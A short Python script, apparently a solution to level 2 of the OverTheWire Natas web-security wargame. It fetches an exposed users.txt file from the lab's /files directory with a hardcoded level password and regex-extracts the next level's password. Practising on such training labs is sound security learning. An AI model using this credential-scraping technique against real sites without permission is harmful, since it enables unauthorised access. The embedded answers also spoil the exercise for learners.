#!/usr/bin/env python

#using requests module for python to pull the pages.
import requests
import re

"""Notice for this level the URL is different, has items on the end
After pulling the original page we noticed that there was no password.
However, there was a picture stored at a /files directory. We could pull that and found more files, one being a text file
We were able to pull that and the password was within
"""
username = 'natas2'
password = 'h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7'
url = 'http://%s.natas.labs.overthewire.org/files' % username
#investigating the /files directory we saw when pulling the whole page
url = 'http://%s.natas.labs.overthewire.org/files/users.txt' % username
#investigating the text file in /files

#make sure the URL works fine
#print(url) #not needed right now, commented

#grab the page
response = requests.get(url, auth = (username, password))
content = response.text
#print(content)

#regex needed to be slightly different than the last level
print(re.findall('natas3:(.*)', content))